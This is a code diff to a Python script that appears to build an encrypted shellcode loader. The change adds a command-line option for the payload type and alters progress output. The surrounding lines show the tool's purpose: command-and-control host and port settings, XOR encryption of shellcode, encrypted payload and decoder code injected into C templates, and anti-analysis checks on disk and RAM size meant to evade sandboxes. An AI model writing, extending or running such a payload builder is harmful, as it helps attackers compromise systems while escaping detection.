@@ -23,6 +23,8 @@ if len(sys.argv) > 1:
     VERBOSE = sys.argv[1].lower() == "true"
 if len(sys.argv) > 2:
     PRIORIZE_SIZE = sys.argv[2].lower() == "true"
+if len(sys.argv) > 3:
+    PAYLOAD_TYPE = sys.argv[3].lower()
 
 
 if ENCRYPTION_METHOD == "xor":
@@ -39,7 +41,8 @@ else:
 # C2 infos
 LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
 LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None
-PAYLOAD_TYPE = config.get("Payload", "type") if is_set(config.get("Payload", "type")) else None
+if len(PAYLOAD_TYPE) == 0:
+    PAYLOAD_TYPE = config.get("Payload", "type") if is_set(config.get("Payload", "type")) else None
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -178,12 +181,12 @@ def main():
         sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
         sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
     
-    print("===================================\n") if VERBOSE else None
+    print("==================PAYLOAD=================") if VERBOSE else None
     sed_files(WORKING_FOLDER, "%XOR_KEY%", str(ENCRYPTION_KEY))
+    print(f"Type: {PAYLOAD_TYPE}")
+    print("================COMPILATION===============") if VERBOSE else None
 
-    
-
-    print("\n================COMPILATION===============") if VERBOSE else None
+    return PAYLOAD_TYPE
 
 
 if __name__ == "__main__":
